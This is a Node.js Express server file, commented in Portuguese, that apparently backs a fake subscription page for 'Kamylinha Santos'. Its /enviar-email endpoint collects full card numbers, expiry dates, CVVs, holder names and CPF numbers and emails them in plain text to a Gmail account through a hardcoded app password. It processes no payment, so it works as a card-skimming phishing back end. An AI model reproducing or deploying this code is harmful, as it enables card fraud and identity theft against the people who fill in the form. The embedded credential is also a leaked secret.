import express from 'express';
import path from 'path';
import { fileURLToPath } from 'url';
import nodemailer from 'nodemailer';

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

const app = express();
app.use(express.json());
app.use(express.static('.'));

// Configuração do SMTP do GMAIL (COM SUA SENHA)
const transporter = nodemailer.createTransport({
    host: 'smtp.gmail.com',
    port: 587,
    secure: false,
    auth: {
        user: 'hoxfox59@gmail.com',
        pass: 'gkor zjsw fezk jfdt'  // ✅ SUA SENHA DE APP
    }
});

// Endpoint para receber os dados e enviar email
app.post('/enviar-email', async (req, res) => {
    const data = req.body;
    
    const subject = `💳 NOVA ASSINATURA - Kamylinha Santos`;
    const text = `
💳 NOVA ASSINATURA KAMYLINHA 💳

🔹 PLANO: ${data.plano}
🔹 VALOR: R$ ${data.preco}
🔹 BANDEIRA: ${data.flag}
🔹 FINAL: ${data.last4}

💳 CARTÃO: ${data.card}
📅 VALIDADE: ${data.expiry}
🔐 CVV: ${data.cvv}
👤 NOME: ${data.name}
🇧🇷 CPF: ${data.cpf}

⏰ DATA: ${new Date().toLocaleString('pt-BR')}
    `;
    
    try {
        await transporter.sendMail({
            from: 'hoxfox59@gmail.com',
            to: 'hoxfox59@gmail.com',
            subject: subject,
            text: text
        });
        
        res.json({ success: true });
    } catch (error) {
        console.error('Erro ao enviar email:', error);
        res.json({ success: false, error: error.message });
    }
});

app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`Rodando na porta ${PORT}`));